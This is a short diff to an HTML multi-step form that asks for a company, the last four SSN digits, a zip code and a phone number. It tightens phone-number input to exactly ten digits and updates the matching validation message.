@@ -53,7 +53,6 @@
                 <option value="AMAZON">AMAZON</option>
                 <option value="GOOGLE">GOOGLE</option>
                 <option value="META">META</option>
-                <!-- Add more companies here if needed -->
             </select>
 
             <label>Last 4 Digits of SSN</label>
@@ -77,8 +76,9 @@
             <label>Zip Code</label>
             <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
 
-            <label>Phone Number</label>
-            <input type="tel" id="phone" placeholder="(123) 456-7890" required>
+            <label>Phone Number (US - 10 digits)</label>
+            <input type="tel" id="phone" maxlength="10" placeholder="1234567890" 
+                   oninput="this.value = this.value.replace(/[^0-9]/g,'')" required>
 
             <button class="continue" onclick="saveStep2()">Continue</button>
         </div>
@@ -144,8 +144,8 @@
             const zip = document.getElementById('zip').value.trim();
             const phone = document.getElementById('phone').value.trim();
 
-            if (zip.length !== 5 || !phone) {
-                alert("Please enter a valid 5-digit Zip Code and Phone Number.");
+            if (zip.length !== 5 || phone.length !== 10) {
+                alert("Please enter valid Zip Code (5 digits) and Phone Number (exactly 10 digits).");
                 return;
             }
 
